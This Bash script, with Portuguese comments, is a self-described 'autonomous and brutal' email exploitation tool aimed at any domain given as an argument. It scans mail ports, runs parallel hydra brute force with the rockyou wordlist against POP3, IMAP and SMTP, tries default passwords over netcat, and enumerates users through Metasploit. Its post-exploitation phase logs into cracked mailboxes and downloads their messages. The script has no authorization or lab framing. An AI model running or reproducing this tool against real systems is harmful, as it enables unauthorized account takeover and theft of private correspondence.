#!/bin/bash
# Script de Exploração Email (POP3/IMAP/SMTP) - Autônomo e Brutal

# Solicitar target do usuário
if [ -z "$1" ]; then
    echo "Uso: $0 <DOMINIO>"
    echo "Exemplo: $0 exemplo.com.br"
    exit 1
fi

TARGET="$1"
POP3_PORT="110"
POP3S_PORT="995"
IMAP_PORT="143"
IMAPS_PORT="993"
SMTP_PORT="25"
SMTPS_PORT="465"
SUBMISSION_PORT="587"
LOG_DIR="./logs"
RESULTS_DIR="./results"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[*] Iniciando exploração de serviços de email contra ${TARGET}${NC}"

mkdir -p $LOG_DIR $RESULTS_DIR

# Verificar e instalar ferramentas
check_and_install() {
    if ! command -v $1 &> /dev/null; then
        echo -e "${YELLOW}[!] $1 não encontrado. Instalando...${NC}"
        sudo apt-get update -qq
        sudo apt-get install -y $2
    fi
}

echo -e "${GREEN}[*] Verificando ferramentas...${NC}"
check_and_install "nmap" "nmap"
check_and_install "hydra" "hydra"
check_and_install "msfconsole" "metasploit-framework"
check_and_install "telnet" "telnet"
check_and_install "openssl" "openssl"

# Wordlist
if [ ! -f "/tmp/rockyou.txt" ]; then
    sudo gunzip -c /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt 2>/dev/null || \
    wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /tmp/rockyou.txt
fi

# Gerar lista de emails comuns
echo -e "${GREEN}[*] Gerando lista de emails...${NC}"
cat > /tmp/email_list.txt << EOF
admin@${TARGET}
administrator@${TARGET}
root@${TARGET}
test@${TARGET}
user@${TARGET}
info@${TARGET}
contato@${TARGET}
suporte@${TARGET}
webmaster@${TARGET}
postmaster@${TARGET}
mail@${TARGET}
EOF

# 1. SCANNING E RECONHECIMENTO
echo -e "${GREEN}[*] Fase 1: Scanning e Reconhecimento${NC}"

# POP3
nmap -p $POP3_PORT --script pop3-capabilities,pop3-brute $TARGET -oN $LOG_DIR/pop3_scan.txt
nmap -p $POP3S_PORT --script ssl-cert,pop3-capabilities $TARGET -oN $LOG_DIR/pop3s_scan.txt

# IMAP
nmap -p $IMAP_PORT --script imap-capabilities,imap-brute $TARGET -oN $LOG_DIR/imap_scan.txt
nmap -p $IMAPS_PORT --script ssl-cert,imap-capabilities $TARGET -oN $LOG_DIR/imaps_scan.txt

# SMTP
nmap -p $SMTP_PORT --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720 $TARGET -oN $LOG_DIR/smtp_scan.txt
nmap -p $SMTPS_PORT --script ssl-cert,smtp-commands $TARGET -oN $LOG_DIR/smtps_scan.txt
nmap -p $SUBMISSION_PORT --script smtp-commands $TARGET -oN $LOG_DIR/submission_scan.txt

# 2. BRUTE FORCE POP3
echo -e "${GREEN}[*] Fase 2: Brute Force POP3${NC}"
while IFS= read -r email; do
    user=$(echo $email | cut -d@ -f1)
    echo -e "${RED}[!] Brute force POP3 para: $email${NC}"
    hydra -l "$email" -P /tmp/rockyou.txt $TARGET pop3 -t 16 -W 1 -f -o $LOG_DIR/hydra_pop3_${user}.txt 2>&1 &
done < /tmp/email_list.txt
wait

# 3. BRUTE FORCE POP3S
echo -e "${GREEN}[*] Fase 3: Brute Force POP3S${NC}"
while IFS= read -r email; do
    user=$(echo $email | cut -d@ -f1)
    echo -e "${RED}[!] Brute force POP3S para: $email${NC}"
    hydra -l "$email" -P /tmp/rockyou.txt $TARGET pop3s -S -t 16 -W 1 -f -o $LOG_DIR/hydra_pop3s_${user}.txt 2>&1 &
done < /tmp/email_list.txt
wait

# 4. BRUTE FORCE IMAP
echo -e "${GREEN}[*] Fase 4: Brute Force IMAP${NC}"
while IFS= read -r email; do
    user=$(echo $email | cut -d@ -f1)
    echo -e "${RED}[!] Brute force IMAP para: $email${NC}"
    hydra -l "$email" -P /tmp/rockyou.txt $TARGET imap -t 16 -W 1 -f -o $LOG_DIR/hydra_imap_${user}.txt 2>&1 &
done < /tmp/email_list.txt
wait

# 5. BRUTE FORCE IMAPS
echo -e "${GREEN}[*] Fase 5: Brute Force IMAPS${NC}"
while IFS= read -r email; do
    user=$(echo $email | cut -d@ -f1)
    echo -e "${RED}[!] Brute force IMAPS para: $email${NC}"
    hydra -l "$email" -P /tmp/rockyou.txt $TARGET imaps -S -t 16 -W 1 -f -o $LOG_DIR/hydra_imaps_${user}.txt 2>&1 &
done < /tmp/email_list.txt
wait

# 6. ENUMERAÇÃO DE USUÁRIOS SMTP
echo -e "${GREEN}[*] Fase 6: Enumeração de Usuários SMTP${NC}"

# Metasploit - SMTP user enumeration
msfconsole -q -x "
use auxiliary/scanner/smtp/smtp_enum;
set RHOSTS $TARGET;
set RPORT $SMTP_PORT;
set USER_FILE /tmp/email_list.txt;
run;
exit;
" > $LOG_DIR/metasploit_smtp_enum.txt 2>&1

# 7. BRUTE FORCE SMTP
echo -e "${GREEN}[*] Fase 7: Brute Force SMTP${NC}"
while IFS= read -r email; do
    user=$(echo $email | cut -d@ -f1)
    echo -e "${RED}[!] Brute force SMTP para: $email${NC}"
    hydra -l "$email" -P /tmp/rockyou.txt $TARGET smtp -t 16 -W 1 -f -o $LOG_DIR/hydra_smtp_${user}.txt 2>&1 &
done < /tmp/email_list.txt
wait

# 8. TENTATIVAS DE CONEXÃO DIRETA
echo -e "${GREEN}[*] Fase 8: Tentativas de Conexão Direta${NC}"

COMMON_PASSWORDS=("password" "123456" "admin" "test" "root" "user")

# POP3
echo -e "${YELLOW}[*] Testando POP3...${NC}"
while IFS= read -r email; do
    for pass in "${COMMON_PASSWORDS[@]}"; do
        echo -e "${YELLOW}[*] Tentando POP3: $email:$pass${NC}"
        (echo "USER $email"; echo "PASS $pass"; echo "QUIT") | nc $TARGET $POP3_PORT > $LOG_DIR/pop3_connections.txt 2>&1
        if grep -q "+OK" $LOG_DIR/pop3_connections.txt; then
            echo -e "${GREEN}[!!!] SUCESSO POP3: $email:$pass${NC}" | tee -a $RESULTS_DIR/pop3_credentials.txt
        fi
    done
done < /tmp/email_list.txt

# IMAP
echo -e "${YELLOW}[*] Testando IMAP...${NC}"
while IFS= read -r email; do
    for pass in "${COMMON_PASSWORDS[@]}"; do
        echo -e "${YELLOW}[*] Tentando IMAP: $email:$pass${NC}"
        (echo "a1 LOGIN $email $pass"; echo "a2 LOGOUT") | nc $TARGET $IMAP_PORT > $LOG_DIR/imap_connections.txt 2>&1
        if grep -q "OK" $LOG_DIR/imap_connections.txt && ! grep -q "NO\|BAD" $LOG_DIR/imap_connections.txt; then
            echo -e "${GREEN}[!!!] SUCESSO IMAP: $email:$pass${NC}" | tee -a $RESULTS_DIR/imap_credentials.txt
        fi
    done
done < /tmp/email_list.txt

# 9. PÓS-EXPLORAÇÃO - ACESSO A EMAILS
echo -e "${GREEN}[*] Fase 9: Pós-Exploração${NC}"

# Se encontrar credenciais POP3
if [ -f "$RESULTS_DIR/pop3_credentials.txt" ]; then
    echo -e "${GREEN}[+] Credenciais POP3 encontradas! Acessando emails...${NC}"
    while IFS= read -r line; do
        if [[ $line == *"SUCESSO"* ]]; then
            email=$(echo $line | grep -oP 'SUCESSO POP3: \K[^:]*')
            pass=$(echo $line | grep -oP 'SUCESSO POP3: [^:]*:\K.*')
            
            echo -e "${RED}[!] Baixando emails de $email...${NC}"
            (echo "USER $email"; echo "PASS $pass"; echo "LIST"; echo "RETR 1"; echo "QUIT") | nc $TARGET $POP3_PORT > $RESULTS_DIR/emails_${email//@/_}.txt 2>&1
        fi
    done < $RESULTS_DIR/pop3_credentials.txt
fi

# Se encontrar credenciais IMAP
if [ -f "$RESULTS_DIR/imap_credentials.txt" ]; then
    echo -e "${GREEN}[+] Credenciais IMAP encontradas! Acessando emails...${NC}"
    while IFS= read -r line; do
        if [[ $line == *"SUCESSO"* ]]; then
            email=$(echo $line | grep -oP 'SUCESSO IMAP: \K[^:]*')
            pass=$(echo $line | grep -oP 'SUCESSO IMAP: [^:]*:\K.*')
            
            echo -e "${RED}[!] Listando emails de $email...${NC}"
            (echo "a1 LOGIN $email $pass"; echo "a2 LIST \"\" \"*\""; echo "a3 SELECT INBOX"; echo "a4 FETCH 1:* BODY[]"; echo "a5 LOGOUT") | openssl s_client -connect $TARGET:$IMAPS_PORT -quiet 2>/dev/null > $RESULTS_DIR/imap_emails_${email//@/_}.txt 2>&1
        fi
    done < $RESULTS_DIR/imap_credentials.txt
fi

# 10. EXPLORAÇÃO DE VULNERABILIDADES SMTP
echo -e "${GREEN}[*] Fase 10: Exploração de Vulnerabilidades SMTP${NC}"

# Open Relay Test
echo -e "${YELLOW}[*] Testando Open Relay...${NC}"
(echo "EHLO test"; echo "MAIL FROM:test@test.com"; echo "RCPT TO:test@external.com"; echo "DATA"; echo "Test"; echo "."; echo "QUIT") | nc $TARGET $SMTP_PORT > $RESULTS_DIR/smtp_openrelay_test.txt 2>&1

if grep -q "250\|354" $RESULTS_DIR/smtp_openrelay_test.txt; then
    echo -e "${RED}[!!!] OPEN RELAY DETECTADO!${NC}" | tee -a $RESULTS_DIR/smtp_openrelay.txt
fi

# Metasploit - SMTP exploits
msfconsole -q -x "
use auxiliary/scanner/smtp/smtp_relay;
set RHOSTS $TARGET;
set RPORT $SMTP_PORT;
run;
exit;
" > $LOG_DIR/metasploit_smtp_relay.txt 2>&1

echo -e "${GREEN}[*] Exploração de Email concluída!${NC}"
echo -e "${GREEN}[*] Logs: $LOG_DIR${NC}"
echo -e "${GREEN}[*] Resultados: $RESULTS_DIR${NC}"

